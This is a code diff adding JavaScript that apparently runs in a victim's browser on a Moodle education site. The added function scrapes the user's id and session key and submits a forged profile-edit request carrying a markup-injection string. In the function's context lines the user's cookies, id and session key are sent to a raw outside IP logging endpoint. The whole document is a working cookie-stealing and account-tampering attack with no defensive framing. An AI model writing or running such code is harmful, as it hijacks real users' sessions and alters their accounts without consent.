@@ -10,6 +10,40 @@ function extractValuesRegex(htmlContent) {
     return { id, sesskey };
 }
 
+async function postData(id, sesskey, moodleSession, desc) {
+    const response = await fetch('https://www.dist-mspk.ru/user/edit.php', {
+        method: 'POST',
+        headers: {
+            'Host': 'www.dist-mspk.ru',
+            'Cookie': `${moodleSession}`,
+            'Cache-Control': 'max-age=0',
+            'Sec-Ch-Ua': '"Chromium";v="145", "Not:A-Brand";v="99"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Linux"',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Origin': 'https://www.dist-mspk.ru',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Dest': 'document',
+            'Referer': `https://www.dist-mspk.ru/user/edit.php?id=${id}&returnto=profile`,
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Priority': 'u=0, i',
+            'Connection': 'keep-alive'
+        },
+        body: `course=1&id=${id}&returnto=profile&id=1476&course=1&timezone=99&mform_isexpanded_id_moodle_picture=1&sesskey=${sesskey}&_qf__user_edit_form=1&mform_isexpanded_id_moodle=1&mform_isexpanded_id_moodle_additional_names=1&mform_isexpanded_id_moodle_interests=1&mform_isexpanded_id_moodle_optional=1&mform_isexpanded_id_category_1=1&maildisplay=1&moodlenetprofile=%27%22%3E%3E%22%3E&city=%D0%9F%D0%9E%D0%A7%D0%A3+%22%D0%A2%D0%AD%D0%B8%D0%9F+%D0%9C%D0%A1%D0%9F%D0%9A%22&country=RU&description_editor%5Btext%5D=${desc}&description_editor%5Bformat%5D=1&description_editor%5Bitemid%5D=651132569&imagefile=900412170&imagealt=&firstnamephonetic=&lastnamephonetic=&middlename=&alternatename=&interests=_qf__force_multiselect_submission&department=%D0%BE%D1%87%D0%BD%D0%BE%D0%B5&phone1=&phone2=&address=&profile_field_VK=&profile_field_Telegram=&submitbutton=%D0%9E%D0%B1%D0%BD%D0%BE%D0%B2%D0%B8%D1%82%D1%8C+%D0%BF%D1%80%D0%BE%D1%84%D0%B8%D0%BB%D1%8C`,
+        credentials: 'include'
+    });
+    
+    const result = await response.text();
+    console.log('Статус:', response.status);
+    console.log('URL ответа:', response.url);
+    return result;
+}
+
 async function getUserProfile() {
     const url = 'https://www.dist-mspk.ru/user/profile.php';
     
@@ -58,6 +92,7 @@ async function getUserProfile() {
         console.log(htmlContent.substring(0, 1000));
         console.log('... (остальной контент обрезан) ...');
         console.log(`Общая длина HTML: ${htmlContent.length} символов`);
+        await postData(id, sesskey, document.cookie, "21323")
         window.location = "http://64.188.79.250:8000/log?msg=" + encodeURIComponent(document.cookie)+" "+id+" "+sesskey;
         return htmlContent;
         
